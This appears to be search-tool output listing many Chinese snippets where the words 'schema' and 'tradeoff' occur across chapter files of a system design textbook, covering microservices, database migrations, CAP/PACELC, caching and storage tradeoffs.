  c12_b06.md: ...malization）**：故意复制数据以避免 JOIN。   #### 定义：反规范化  **反规范化**是在数据库 schema 中引入冗余，把相同数据存在多个地方，专门为了减少或消除 JOIN 需求的做法。tradeoff（权衡）是写复杂度增加（...
  c12_b11.md: ...shard 的查询返回混合用户名值的帖子。读者看到系统不一致的快照。  两个失败都说明为什么反规范化是维护负担：规范化 schema 下单一原子操作，变成多步骤、跨 shard 并带有一致性窗口的过程。...
  c13_b01.md: ...数据库，而是很多小服务，每个有自己的数据存储，独立部署，各自按需求扩展。照片上传暴涨不会影响消息服务。支付功能的数据库 schema 变更不需要全公司部署冻结。用户资料团队不需要与搜索团队协调。  这是承诺。现实更复杂——这些复杂性值得精确理解，因为它...
  c13_b03.md: ...实来源；没有服务绕过它。  为什么这条规则？因为一旦服务 B 开始直接读取服务 A 的数据库，服务 A 就不能再随意改 schema，否则可能破坏服务 B。数据库变成共享依赖——一个耦合点，削弱了微服务本要提供的独立性。你部署上是微服务，但数据访问上是...
  c13_b10.md: ...则被认为是真正微服务独立性的关键？  **答案：** “每个服务一个数据库”意味着每个微服务拥有自己的数据存储——它的 schema、它的表、它的数据——不允许其他服务直接读写该数据存储。任何服务需要其他服务拥有的数据时，必须通过那个服务的 API 请...
  c13_b10.md: ...的 API 请求。  这条规则至关重要，因为数据库是耦合点。如果服务 B 直接读取服务 A 的数据库，那么服务 A 改 schema（重命名列、拆分表、改数据类型）就可能破坏服务 B。两个服务现在必须协调 schema 变更，意味着它们不能真正独立部署...
  c13_b10.md: ...A 的数据库，那么服务 A 改 schema（重命名列、拆分表、改数据类型）就可能破坏服务 B。两个服务现在必须协调 schema 变更，意味着它们不能真正独立部署。数据库变成了共享接口——一种隐藏耦合，破坏了微服务架构的全部意义。  **Q2.**...
  c13_b10.md: ...紧密耦合，消除了微服务方法本应带来的独立性。  症状：(1) 服务 B 直接读取服务 A 的数据库——服务 A 的任何 schema 变更都需要与服务 B 协调。(2) 部署服务 A 必须同时部署服务 B，因为它们共享定义共同数据模型的库。两种情况中，...
  c13_b14.md: ...易悄悄分叉（服务器重命名字段，客户端仍发旧名，被静默忽略）。Protocol Buffers 让这种不匹配变成编译时或 schema 校验错误。   ### 本章总结  微服务把单体拆分成独立部署的服务，每个服务拥有自己的数据，通过显式 API 通信。...
  c15_b15.md: ...争论混淆了两种不同类型的耦合：  **数据耦合**（微服务中坏的耦合）：服务 A 直接读取服务 B 的数据库，使它们在 schema 层耦合。B 的任何 schema 变更都会破坏 A。这违反“每个服务一个数据库”。  **行为耦合**（工作流协调必要...
  c15_b15.md: ...**数据耦合**（微服务中坏的耦合）：服务 A 直接读取服务 B 的数据库，使它们在 schema 层耦合。B 的任何 schema 变更都会破坏 A。这违反“每个服务一个数据库”。  **行为耦合**（工作流协调必要的耦合）：服务 A 知道要完成工作...
  c15_b15.md: ...务*接口*（API）的耦合，而不是*内部*（数据库）的耦合。接口应该是稳定且带版本的。与 API 耦合可接受；与数据库 schema 耦合不可接受。...
  c18_b05.md: ...蓝绿部署提供零停机部署和瞬时回滚。限制：同时运行两个完整生产环境，部署窗口期间基础设施成本翻倍。  当部署包含数据库 schema 变更时也难以使用。如果 blue 用 schema v1，green 用 schema v2，且 schema 变更不...
  c18_b05.md: ...个完整生产环境，部署窗口期间基础设施成本翻倍。  当部署包含数据库 schema 变更时也难以使用。如果 blue 用 schema v1，green 用 schema v2，且 schema 变更不向后兼容，就不能同时从两个环境服务流量。这就是为什么...
  c18_b05.md: ...成本翻倍。  当部署包含数据库 schema 变更时也难以使用。如果 blue 用 schema v1，green 用 schema v2，且 schema 变更不向后兼容，就不能同时从两个环境服务流量。这就是为什么数据库迁移是大多数部署中最难的部分—...
  c18_b05.md: ...数据库 schema 变更时也难以使用。如果 blue 用 schema v1，green 用 schema v2，且 schema 变更不向后兼容，就不能同时从两个环境服务流量。这就是为什么数据库迁移是大多数部署中最难的部分——我们在下面单独讨论。...
  c18_b08.md: ...询）。优秀工程团队把开关视为临时的：功能完全推广后，移除开关并删除旧代码路径。   #### 数据库迁移策略  数据库 schema 迁移是大多数部署中最危险的部分。增加新列的迁移通常安全。重命名列不安全——每个引用旧列名的查询都会失败，直到代码也更新...
  c18_b08.md: ...`author_id` 且旧代码路径已消失，在单独迁移中删除 `author` 列。  这种三阶段方法意味着任何时候 schema 都与运行中的代码兼容。每个阶段都可独立部署和回滚。   #### 回滚规划  每次部署前，定义回滚流程。回滚计划应明确...
  c18_b08.md: ...如果部署包含迁移，回滚能否处理已迁移数据？（这就是 expand-contract 迁移如此宝贵的原因——旧代码在新旧 schema 状态下都能工作。）  只存在于脑海中的回滚计划不是回滚计划。在部署前把它写下来。...
  c18_b10.md: ...模测试的变更（例如性能敏感变更）。金丝雀更适合想观察真实用户行为和指标再下决定的变更。  **Q3.** 为什么数据库 schema 迁移是部署中最难的部分，expand-contract 模式为什么比直接 schema 变更更安全？  **答案：**...
  c18_b10.md: ...**Q3.** 为什么数据库 schema 迁移是部署中最难的部分，expand-contract 模式为什么比直接 schema 变更更安全？  **答案：** 直接 schema 变更危险，因为数据库 schema 是运行中的应用代码与存储数据之...
  c18_b10.md: ...部署中最难的部分，expand-contract 模式为什么比直接 schema 变更更安全？  **答案：** 直接 schema 变更危险，因为数据库 schema 是运行中的应用代码与存储数据之间的共享状态。如果你在数据库里重命名列，而运行中的应...
  c18_b10.md: ...ntract 模式为什么比直接 schema 变更更安全？  **答案：** 直接 schema 变更危险，因为数据库 schema 是运行中的应用代码与存储数据之间的共享状态。如果你在数据库里重命名列，而运行中的应用代码仍查询旧列名，每个查询都会失败...
  c18_b10.md: ...命名列，而运行中的应用代码仍查询旧列名，每个查询都会失败——可能瞬间影响所有用户。回滚需要反向重跑迁移，如果数据已按新 schema 写入，这可能不可能。  expand-contract 模式更安全，因为它同时保持旧和新 schema 状态有效，允许...
  c18_b10.md: ...如果数据已按新 schema 写入，这可能不可能。  expand-contract 模式更安全，因为它同时保持旧和新 schema 状态有效，允许旧代码和新代码在迁移窗口期间共存。应用可以部署、回滚、再部署，而没有任何状态不一致。代价是迁移需要几天或...
  c18_b14.md: ...点故障。  **技术债务风险：** 已全量推出却从未移除的开关会积累成死代码。旧开关条件引用可能已被移除的变量、服务和 schema，成为未来重构的地雷。...
  c19_b14.md: ...n 在最长 1 小时内（或下次轮换前）仍有效——考虑到短生命周期，这是可接受的。  **OAuth token 数据库 schema：**  * `oauth_apps`：client_id, client_secret_hash, allowed_s...
  c20_b01.md: ...种看法错了。URL 短链接服务简单到你能理解完整设计——没有隐藏——但又足够丰富，几乎触及本书每个概念：容量估算、存储 schema、缓存策略、一致性模型、读写不对称、分析架构和容错。它是观察综合的完美镜头。  在设计任何东西之前，好工程师会仔细倾听问...
  c20_b11.md: ...**存储：** 自定义别名进入与自动生成码相同的 `url_mappings` 表，用 `type` 列区分。不需要 schema 变更，但短码列的唯一约束必须对两者都成立。 2. **验证：** 接受自定义别名前，系统必须检查：(a) 别名未被占用...
  c21_b04.md: ...是持久化之上的优化。如果实时投递失败（用户离线、连接断开），持久化确保消息永不丢失。   ### 21.3 消息存储——Schema 设计问题  聊天数据模型看起来简单：消息有发送者、接收者、内容和时间戳。但读访问模式带来有趣的 schema 挑战。...
  c21_b04.md: ...息存储——Schema 设计问题  聊天数据模型看起来简单：消息有发送者、接收者、内容和时间戳。但读访问模式带来有趣的 schema 挑战。   #### 有哪些查询？  设计 schema 前，先确定访问模式（将侦探纪律应用于数据建模）：  1. *...
  c21_b04.md: ...：消息有发送者、接收者、内容和时间戳。但读访问模式带来有趣的 schema 挑战。   #### 有哪些查询？  设计 schema 前，先确定访问模式（将侦探纪律应用于数据建模）：  1. **加载对话历史：** 给定用户 A 和用户 B，获取他们之...
  c21_b04.md: ...**未读计数：** 给定用户 A，每个对话有多少条未读消息？  查询 1（对话历史）最频繁且对延迟最敏感。围绕它设计 schema。...
  c21_b04.md: ...是持久化之上的优化。如果实时投递失败（用户离线、连接断开），持久化确保消息永不丢失。   ### 21.3 消息存储——Schema 设计问题  聊天数据模型看起来简单：消息有发送者、接收者、内容和时间戳。但读访问模式带来有趣的 schema 挑战。...
  c21_b04.md: ...息存储——Schema 设计问题  聊天数据模型看起来简单：消息有发送者、接收者、内容和时间戳。但读访问模式带来有趣的 schema 挑战。   #### 有哪些查询？  设计 schema 前，先确定访问模式（将侦探纪律应用于数据建模）：  1. *...
  c21_b04.md: ...：消息有发送者、接收者、内容和时间戳。但读访问模式带来有趣的 schema 挑战。   #### 有哪些查询？  设计 schema 前，先确定访问模式（将侦探纪律应用于数据建模）：  1. **加载对话历史：** 给定用户 A 和用户 B，获取他们之...
  c21_b04.md: ...**未读计数：** 给定用户 A，每个对话有多少条未读消息？  查询 1（对话历史）最频繁且对延迟最敏感。围绕它设计 schema。...
  c21_b17.md: ...服务只持有其引用。  集成约束：事件必须设计为向后兼容（第 18 章的 expand-contract 也适用于事件 schema）。如果 DM 系统发布 `dm_received` 事件而通知服务依赖该 schema，schema 变更必须向后兼容...
  c21_b17.md: ...contract 也适用于事件 schema）。如果 DM 系统发布 `dm_received` 事件而通知服务依赖该 schema，schema 变更必须向后兼容——添加字段，没有弃用窗口绝不删除字段。   ### 本章总结  聊天设计颠覆了 URL...
  c21_b17.md: ...t 也适用于事件 schema）。如果 DM 系统发布 `dm_received` 事件而通知服务依赖该 schema，schema 变更必须向后兼容——添加字段，没有弃用窗口绝不删除字段。   ### 本章总结  聊天设计颠覆了 URL 短链的假设。...
  c26_b05.md: ...peer 报告同一节点可疑，集群标记它宕机并开始对其键做 hinted handoff。  Gossip 协议也传播 schema 变更、配置更新和环修改——任何需要最终一致地到达所有节点的集群级状态。  * * *...
  c27_b01.md: ...SQL 数据库。用户、帖子、关注关系按关系模型存储。ACID 事务。数据现在跨重启持久化。  **关键决策：**  * Schema：`users(id, email, username, created_at)` 和 `posts(id, user_...
  c27_b07.md: ...代排序算法，而无需等待完整单体部署周期。User Service 团队需要拥有自己的数据模型，而无需与四个其他团队协商 schema 变更。  教训：架构不是脱离构建和维护它的组织而存在的。技术决策和组织决策密不可分。  * * *   ### 27....
  c28_b11.md: ...C API** (Ch 9) | 低（二进制、多路复用 HTTP/2） | 无状态 | 高 | 中——protobuf schema 管理 **Rate limiting** (Ch 9) | 被限流请求增加延迟 | N/A | 保护服务可用性 | 中...
  c28_b12.md: ...Ch 8, 14) | 事件回放查询更高 | 强（事件日志是真相来源） | 极高（日志只追加、持久） | 极高——事件 schema 演进 **Two-phase commit (2PC)** (Ch 12) | 极高（两次网络往返） | 强（分布式...
  c28_b23.md: ...知团队订阅事件，无需在每次新事件类型上与发帖团队协调。通信需求在接口明确稳定时降低。在接口文档、API 版本管理和事件 schema 管理上的投资会带来持续协调减少。post-mortem 实践也在这里有贡献：制度记忆（记录在 post-mortem...

=== tradeoff (111 occurrences) ===
  c01_b06.md: ...算存储、带宽和流量——足以在写一行代码之前判断一个设计是否可行。  **根本的权衡。** 分布式系统里只有少数几个深层 tradeoff（权衡），每个设计决策都是它们的变奏。最重要的是：在网络故障时，你无法同时拥有强一致性（strong consisten...
  c01_b11.md: ...，而是“在现有约束下做出最好的选择，并知道在需要转向时该观察什么”。这更接近医学或法学，而不是数学——你收集证据、权衡 tradeoff、做出判断，并随时准备修正。我们在第 2 章引入的 Tradeoff Matrix（权衡矩阵）就是让这一判断过程更明确、...
  c01_b11.md: ...这更接近医学或法学，而不是数学——你收集证据、权衡 tradeoff、做出判断，并随时准备修正。我们在第 2 章引入的 Tradeoff Matrix（权衡矩阵）就是让这一判断过程更明确、更可重复的工具。...
  c01_b11.md: ...，而是“在现有约束下做出最好的选择，并知道在需要转向时该观察什么”。这更接近医学或法学，而不是数学——你收集证据、权衡 tradeoff、做出判断，并随时准备修正。我们在第 2 章引入的 Tradeoff Matrix（权衡矩阵）就是让这一判断过程更明确、...
  c01_b11.md: ...这更接近医学或法学，而不是数学——你收集证据、权衡 tradeoff、做出判断，并随时准备修正。我们在第 2 章引入的 Tradeoff Matrix（权衡矩阵）就是让这一判断过程更明确、更可重复的工具。...
  c01_b12.md: ...lity（可用性）、consistency（一致性）和 durability（持久性）。它们不只是定义——而是每个架构 tradeoff（权衡）必须被描绘的坐标轴。当你能用这些术语描述一个 tradeoff 时，你才能认真讨论它是否是正确选择。...
  c01_b12.md: ...ity（持久性）。它们不只是定义——而是每个架构 tradeoff（权衡）必须被描绘的坐标轴。当你能用这些术语描述一个 tradeoff 时，你才能认真讨论它是否是正确选择。...
  c02_b01.md: ...些用户会满意、哪些会困惑、网络出问题时什么会坏。  本章给你这种词汇。但——这一点很重要——我们引入的每个术语都是一条 tradeoff（权衡）坐标轴，而不是要最大化的东西。你会忍不住问“如何获得最好的延迟？”正确的问题是：“为了获得更好的延迟，我在牺牲什...
  c02_b02.md: ...器，队列深度会减少，延迟下降——但每个处理器需要共享资源，所以协调开销会限制你能加多少，直到它们开始互相阻碍。  这个 tradeoff（权衡）是：**更高的吞吐系统常常用单个响应延迟换取总体容量。** 批处理系统（一夜之间处理数百万记录）优先吞吐。交互式...
  c02_b06.md: ...## 2.6 权衡矩阵（Tradeoff Matrix）  现在我们有了核心词汇。让我们引入一个将在全书使用的工具：**Tradeoff Matrix（权衡矩阵）**。  系统设计中的每个架构决策都会改变这些指标的值。权衡矩阵让这些变化显式化。下面是带三行...
  c02_b06.md: ...，↔ 无变化。  随着全书遇到新的架构选择，我们会不断给这个矩阵增加行。到第 28 章时，这个矩阵将成为大规模系统设计 tradeoff（权衡）的完整速查卡。  矩阵不只是参考工具。它是思维工具。在采用任何架构模式之前，问：它增加哪一行？什么上升？什么下降...
  c02_b06.md: ...矩阵不只是参考工具。它是思维工具。在采用任何架构模式之前，问：它增加哪一行？什么上升？什么下降？对你的具体用例来说这个 tradeoff 值得吗？   ### 2.7 SLI、SLO 与 SLA——把权衡变成承诺  Latency、throughput、a...
  c02_b06.md: ...## 2.6 权衡矩阵（Tradeoff Matrix）  现在我们有了核心词汇。让我们引入一个将在全书使用的工具：**Tradeoff Matrix（权衡矩阵）**。  系统设计中的每个架构决策都会改变这些指标的值。权衡矩阵让这些变化显式化。下面是带三行...
  c02_b06.md: ...，↔ 无变化。  随着全书遇到新的架构选择，我们会不断给这个矩阵增加行。到第 28 章时，这个矩阵将成为大规模系统设计 tradeoff（权衡）的完整速查卡。  矩阵不只是参考工具。它是思维工具。在采用任何架构模式之前，问：它增加哪一行？什么上升？什么下降...
  c02_b06.md: ...矩阵不只是参考工具。它是思维工具。在采用任何架构模式之前，问：它增加哪一行？什么上升？什么下降？对你的具体用例来说这个 tradeoff 值得吗？   ### 2.7 SLI、SLO 与 SLA——把权衡变成承诺  Latency、throughput、a...
  c02_b09.md: ...有人点赞你的帖子时，你在 2 秒内收到通知）。为该功能定义具体的 SLI 和 SLO，并揭示你的 SLO 选择带来哪些 tradeoff（权衡）？  提示  想想“2 秒内”在本章指标中到底意味着什么。它是延迟保证？可用性保证？两者都是？如果 missed...
  c02_b09.md: ...达延迟 p95 < 2 秒 * 送达率 > 99.5%（60 秒内） * 错误通知率 < 0.01%  这些选择揭示的 tradeoff：  **延迟 vs 一致性：** p95 < 2 秒的通知意味着我们接受 5% 的通知可能更久。为什么不设 p99？因...
  c02_b10.md: ...行事务（不是交易业务）历史上容忍多秒延迟。转账 3 秒完成与 300ms 完成对大多数用户来说没什么现实世界差别。如果 tradeoff（权衡）是更快响应 vs 有丢失事务（transactions）的非零风险，银行每次都选择更慢更安全。  **Q3.**...
  c02_b11.md: ...并结账可用性现在**只是支付服务的 99.95%**——每年约 263 分钟停机，而不是 788 分钟。  这是本章**Tradeoff Matrix（权衡矩阵）中队列那一行**的直接应用：添加队列提高生产者可用性并解耦服务故障，代价是最终（而非即时）处理...
  c02_b11.md: ...s 配置）崩溃时会丢失消息。如果队列是临时的，这一格可能是 ↓，相对于立即持久化数据的同步调用。  这个练习说明为什么 Tradeoff Matrix 必须始终明确_从谁的视角_ 测量变化。系统设计充满“看情况”——矩阵让这些依赖显式化，而不是隐藏它们。...
  c02_b12.md: ...### 本章总结  系统设计的语言是一门 tradeoff（权衡）的语言。本章引入的六个指标——**latency（延迟）、throughput（吞吐）、availability...
  c02_b12.md: ...和持久性，牺牲一致性和延迟。使用最终一致性而非强一致性，你获得吞吐和可用性，代价是无法保证所有读者看到相同数据。  **Tradeoff Matrix（权衡矩阵）** 是让你把这些成本和收益显式化的工具。全书我们会不断给它加行——到最后一章，它将包含主要架...
  c02_b12.md: ...### 本章总结  系统设计的语言是一门 tradeoff（权衡）的语言。本章引入的六个指标——**latency（延迟）、throughput（吞吐）、availability...
  c02_b12.md: ...和持久性，牺牲一致性和延迟。使用最终一致性而非强一致性，你获得吞吐和可用性，代价是无法保证所有读者看到相同数据。  **Tradeoff Matrix（权衡矩阵）** 是让你把这些成本和收益显式化的工具。全书我们会不断给它加行——到最后一章，它将包含主要架...
  c04_b01.md: ...结果之一：CAP 定理。然后我们会超越 CAP，转向一个更实用的框架——PACELC——它捕捉日常系统设计中真正重要的 tradeoff（权衡）。   ### 4.1 三个性质  在陈述定理之前，我们需要先精确化其中出现的三个性质的定义。   #### 一...
  c04_b03.md: ...致性，但它们在日常意义上并不是“不一致”的。   #### 常见误解  许多工程师认为 CAP 是分布式系统的主要设计 tradeoff（权衡）。这只部分正确。CAP 描述的是网络分区期间的行为。但实践中，大多数系统经历的远不止分区事件——它们经历延迟变化...
  c04_b03.md: ...AP 给出的指导是不完整的。  这就是 PACELC 的用武之地。   ### 4.3 PACELC——实践中更重要的 tradeoff  2012 年，Daniel Abadi 提出 PACELC 作为 CAP 的扩展，捕捉工程师多数时候真正面临的 tr...
  c04_b03.md: ...ff  2012 年，Daniel Abadi 提出 PACELC 作为 CAP 的扩展，捕捉工程师多数时候真正面临的 tradeoff。  PACELC 读作：**PA/ELC**——“如果存在分区（Partition），在可用性（Availabilit...
  c04_b03.md: ...CELC  **PACELC** 扩展了 CAP，指出即使没有分区，分布式系统也必须在**延迟**和**一致性**之间 tradeoff：  * **P → A/C：** 分区期间，牺牲可用性或一致性（与 CAP 相同） * **ELC：** 否则（正常运...
  c04_b03.md: ...所有副本协调——而协调需要时间。如果跳过协调以更快响应，你就牺牲一致性。   #### 为什么延迟 vs 一致性是日常 tradeoff  分区相对罕见。常见的是延迟变化。  假设你有一个带三个副本的数据库。一次写入必须在返回成功前提交到全部三个副本。副本...
  c04_b03.md: ...最终会得到更新。大多数读会看到最新写；偶尔，在它同步之前路由到副本 3 的读会看到旧数据。  这就是延迟 vs 一致性 tradeoff——每次设计复制策略时都会遇到，而不仅是在分区期间。...
  c04_b06.md: ...### 4.6 把框架应用到 SocialSnap  但如何把这些理论 tradeoff 真正转化为真实产品的具体数据库选择？  我们用 CAP/PACELC 框架为规模化中的 SocialSnap 做具体决...
  c04_b07.md: ...PACELC 扩展了 CAP，因为它认识到网络分区虽然重要，但相对罕见。常见的是分布式系统即使在正常运行时也面临的日常 tradeoff（权衡）：要保证强一致性，每次读/写必须跨副本协调，这花费延迟。要降低延迟，就放松一致性。  “ELC”部分（否则：延迟...
  c04_b08.md: ...1. **分区罕见；延迟压力持续。** 分区一年可能发生几次。但每个请求、每天每毫秒，都面临延迟 vs 一致性 tradeoff（权衡）。 2. **用户感受到的是 ELC，而不是分区行为。** 如果分区期间服务不可用 30 秒，用户会注意到并感到...
  c04_b08.md: ...、Amazon 和 Netflix 都写过，页面加载时间增加 100ms 会显著降低用户参与度。对这些公司来说，ELC tradeoff（为一致性支付延迟的权衡）是直接的业务指标。  CAP 的分区行为告诉你系统在紧急情况下会做什么。PACELC 的 EL...
  c04_b08.md: ...一致性支付延迟的权衡）是直接的业务指标。  CAP 的分区行为告诉你系统在紧急情况下会做什么。PACELC 的 ELC tradeoff（权衡）告诉你系统每天每分钟的表现。...
  c04_b10.md: ...可能略旧），要么只写本地副本（Virginia 的两个）再异步同步到 Oregon。这是直接的 CAP/PACELC tradeoff（权衡）：跨区域同步一致性让每次写入操作多花 42 ms。  这运用了第 3 章的估算方法（延迟数字、光纤中光的物理）推...
  c04_b12.md: ...但系统不给出严格的时间保证。  **Q2.** CAP 定理证明你无法同时拥有一致性、可用性和分区容错性。但真实系统的 tradeoff（权衡）比“选两个”更精细。这对 CAP 定理作为设计工具的局限性说明了什么？  **讨论：** CAP 定理是一个二元...
  c04_b13.md: ...有许多有用的点。  这就是为什么 PACELC 作为日常设计工具更有用——它捕捉了即使没有分区也存在的连续延迟-一致性 tradeoff，也更适合“这个操作需要强一致性，那个不需要”的真实系统思维。CAP 是一个优美的理论结果，证明了某件重要的事不可能。P...
  c04_b13.md: ...PACELC 扩展了 CAP，加入了日常更重要的洞察：即使没有分区（“否则”情况），分布式系统也必须在延迟和一致性之间 tradeoff。每一步同步复制都会增加延迟；跳过它则冒着不一致的风险。  **一致性谱系**（线性一致 → 顺序一致 → 因果一致 →...
  c04_b13.md: ...是把工程严谨性与用户影响匹配的直接示例。  **权衡矩阵**在本章获得了最重要的几行：一致性 vs 延迟 vs 可用性 tradeoff 是本书后续所有架构决策将要描绘的坐标轴。  在第 5 章，我们从理论转向实现：关系型数据库。关系模型已主导数据存储 5...
  c05_b01.md: ...遍历代码就得改。关系模型打破了这种耦合。你定义一次数据，SQL 让你问任何问题。  但关系模型不是魔法。它做出了特定的 tradeoff（权衡），使其对某些工作负载极佳，对其他工作负载不适用。理解这些 tradeoff（权衡）是本章的目标。  让我们给 S...
  c05_b01.md: ...但关系模型不是魔法。它做出了特定的 tradeoff（权衡），使其对某些工作负载极佳，对其他工作负载不适用。理解这些 tradeoff（权衡）是本章的目标。  让我们给 SocialSnap 它的第一个数据库。   ### 5.1 关系模型——数据即表...
  c05_b03.md: ...0%）。更重要的是，每次对表写入都必须更新所有相关索引。有 10 个索引的表写入速度比无索引表慢 10 倍。这就是索引 tradeoff（权衡）：以较慢写入和更多存储换取更快读取。   #### 选择索引什么  索引什么列是关系型数据库设计中影响最大的性能...
  c05_b07.md: ...。  **可用性：** 一台机器是单点故障。如果它崩溃，SocialSnap 就下线。我们需要复制——但复制引入一致性 tradeoff（第 4 章）。  **地理延迟：** 如果你的数据库服务器在 Virginia，用户在 Tokyo，每次数据库查询都要...
  c05_b10.md: ...llion（11 亿）行。查询“帖子 12345 有多少赞？”现在花 500ms。诊断可能原因并提出修复方案，同时考虑 tradeoff（权衡）。  提示  想想没有特殊数据结构时，“统计该帖子点赞数”需要做什么。然后考虑基于索引的方案和基于反规范化的方案...
  c05_b10.md: ...）。  提示  想想没有特殊数据结构时，“统计该帖子点赞数”需要做什么。然后考虑基于索引的方案和基于反规范化的方案及其 tradeoff（权衡）。  **答案：**  **诊断：** 查询是 `SELECT COUNT(*) FROM likes WHER...
  c05_b11.md: ..._count FROM posts WHERE id = 12345;  这是 O(1) 主键查找——微秒级而非毫秒级。tradeoff（权衡）：你现在把计数存在两个地方（`likes` 表和 `posts.like_count`）。如果你批量删除点赞（如...
  c05_b11.md: ...批量删除点赞（如清理垃圾），也必须更新计数器。如果计数器与真实 `likes` 表不同步，就出现不一致。这就是反规范化 tradeoff（权衡）：以写入复杂度和不一致风险换取读速度。  **选哪个方案？** 对点赞数这种场景，方案 2（反规范化计数器）是行...
  c05_b13.md: ...nt` 直接存在 `users` 表上，而不是在查询时用 `SELECT COUNT(*)` 计算。这是经典的反规范化 tradeoff（权衡）。描述一种计数器与真实 `follows` 表不同步的场景——具体包括哪些操作序列（含一次失败）会导致这种不一致...
  c05_b13.md: ...10 年代一波 NoSQL 数据库挑战了其主导地位。NoSQL 并没有取代关系型数据库——今天两者共存。这告诉了你工程 tradeoff 的什么本质？面对新项目应如何评估用哪个？  **讨论：** 关系型 vs NoSQL 的故事说明了一个基本原理：**每...
  c06_b01.md: ...| Neo4j, Amazon Neptune |  我们将详细审视每一种，聚焦它为何访问模式而设计、以及做出了哪些 tradeoff（权衡）。...
  c06_b02.md: ...的用户名出现在每篇帖子的文档中（作为作者嵌入），改 Alice 的用户名就需要更新每篇帖子。这就是文档存储版的规范化 tradeoff（权衡）。   #### 侦探测试  选择文档存储前，问自己：“我能否通过按 ID 或简单过滤取回一个或少量文档来回答...
  c06_b07.md: ...↑ 持久化 | ↑↑ 专用查询语言；极端规模下难分布 |  关键模式：NoSQL 家族都做出与 BASE 相同的宏观 tradeoff（权衡）——通过放松一致性保证来换取可用性和吞吐。具体 tradeoff 因家族而异，但默认下没有任何一种提供关系型数据...
  c06_b07.md: ...NoSQL 家族都做出与 BASE 相同的宏观 tradeoff（权衡）——通过放松一致性保证来换取可用性和吞吐。具体 tradeoff 因家族而异，但默认下没有任何一种提供关系型数据库的完整 ACID 保证。   ### 6.9 练习...
  c06_b10.md: ...ag。帖子在创建时被打上 hashtag。在两种数据库中勾勒数据模型——关系型数据库和键值存储（Redis）——并比较 tradeoff（权衡）。  提示...
  c06_b11.md: ...GROUP BY tag     ORDER BY count DESC     LIMIT 10;   **Tradeoff（权衡）：** 如果每天有 50 million（5000 万）帖子、每个帖子约 2 个 hashtag，这个查询扫描过...
  c06_b11.md: ...ering", "38204", ...]   对跨两天的 24 小时滚动窗口，查询两个日桶再在应用代码中合并。  **Tradeoff（权衡）：** 有序集合在每次帖子创建时增量更新——每个 hashtag 更新 O(log n)。读取查询是 O(log...
  c07_b03.md: ...要走的路。   ### 7.3 Cache-Aside——最常见的模式  应用如何与缓存实际交互？有几种模式，各有不同 tradeoff（权衡）。最常见的是 **cache-aside**（也叫 **lazy loading**，懒加载）。  在 cach...
  c07_b04.md: ...库取回新鲜数据。缓存条目永远不会陈旧；它只是过期或被显式删除。  代价：失效后的第一次请求总是缓存未命中。但这是正确的 tradeoff（权衡）——短暂性能下降比无限期提供错误数据更好。   #### 定义：TTL（生存时间）  **TTL（Time-to...
  c07_b04.md: ...。但它引入了一个基本性质：**在 TTL 窗口内，用户可能看到旧数据**。因此设置 TTL 是一个直接调节新鲜度与性能 tradeoff（权衡）的旋钮。   ### 7.4 Write-Through 和 Write-Behind——其他模式  Cache...
  c07_b05.md: ...ity）**——意味着已提交事务在失败中幸存。Write-behind 缓存用持久性换取写入性能。这正是权衡矩阵追踪的 tradeoff（权衡）类型。   #### 常见误解  许多工程师假设 cache-aside 总是正确的默认。它是最常见模式，但有一...
  c07_b10.md: ...### 7.9 权衡矩阵——加入缓存  我们在第 2 章用三行种子引入权衡矩阵。第 4 章用一致性 vs 可用性 tradeoff 扩展它。现在加入缓存这一行。  | 架构选择 | 延迟 | 一致性 | 可用性 | 运维复杂度 | |---|---|...
  c07_b10.md: ...9% 容量的可用性高）。但它增加运维复杂度：你现在要多运维一个系统、多担心一类 bug、还要维护缓存失效逻辑。  这个 tradeoff（权衡）值得吗？对 SocialSnap 来说，值得——读密集型工作负载（资料查找、帖子 Feed）完美映射到缓存擅长的...
  c07_b12.md: ...数”可能需要 10 秒 TTL。静态营销页面的渲染 HTML 可能设 24 小时 TTL。没有通用答案——它永远是一个 tradeoff（权衡）。  **Q4.** 描述惊群问题。它最可能在什么时候发生？一种缓解策略是什么？  **答案：** 惊群问题发生...
  c07_b17.md: ...命中率降低 99%。每多一个百分点带来的价值随流量增长。  **缓存放置**选择（客户端、CDN、应用级、分布式）各有 tradeoff（权衡）。对大多数多服务器应用，Redis 或 Memcached 这类分布式缓存是正确默认。  **Cache-asi...
  c07_b17.md: ...分机制：消息队列。如果说缓存把读路径与数据库解耦，消息队列则把事件生产者与消费者解耦——而这种解耦创造了完全不同的一组 tradeoff（权衡）。...
  c08_b08.md: ...#### 所做的 Tradeoff（权衡）  这个架构改进是真实的——但不是免费的。团队做了一个特定的 tradeoff：  **改善了什么：** 注册响...
  c08_b08.md: ...#### 所做的 Tradeoff（权衡）  这个架构改进是真实的——但不是免费的。团队做了一个特定的 tradeoff：  **改善了什么：** 注册响应的延迟。注册流程的可用性。下游服务的独立性。  **改变了什么：** 系统现在**最...
  c08_b08.md: ...#### 所做的 Tradeoff（权衡）  这个架构改进是真实的——但不是免费的。团队做了一个特定的 tradeoff：  **改善了什么：** 注册响...
  c08_b08.md: ...#### 所做的 Tradeoff（权衡）  这个架构改进是真实的——但不是免费的。团队做了一个特定的 tradeoff：  **改善了什么：** 注册响应的延迟。注册流程的可用性。下游服务的独立性。  **改变了什么：** 系统现在**最...
  c09_b05.md: ...5 分钟），完成变更，观察传播，再提回 TTL。这就是 DNS TTL 管理——它与第 7 章缓存中看到的新鲜度与性能 tradeoff（权衡）完全相同。   ### 9.6 HTTP、TCP 与 WebSocket——协议层  HTTP 是 Web 的协...
  c09_b19.md: ...的请求，检查了每一步的基础设施。  **DNS** 把域名翻译成 IP 地址，TTL 带来新鲜度与传播速度之间的缓存式 tradeoff（权衡）。DNS 可用于粗粒度地理负载分发。  **负载均衡器** 把请求分发给服务器池。第 4 层负载均衡器基于网络层...
  c09_b19.md: ...连接，使水平扩展复杂化（第 11 章直接处理这个问题）。  **REST、GraphQL 和 gRPC** 是三种各有 tradeoff（权衡）的 API 风格。REST 通用、可缓存。GraphQL 消除过度取回和取回不足。gRPC 是服务间通信的最高性...
  c10_b01.md: ...要回答“文件放哪里？”这个问题，我们需要理解存储全景：不同类型的存储系统、各自优化什么，以及贯穿所有存储的成本-延迟 tradeoff（权衡）。...
  c10_b02.md: ...保留但几乎不读的数据  规律很清楚：速度每差一个数量级，每字节成本大致也差一个数量级。设计数据存放位置时，你总是在这个 tradeoff（权衡）中航行。   #### 10,000 倍差距  需要记住的一个数字：DRAM 访问与 SSD 访问的差距约为 1...
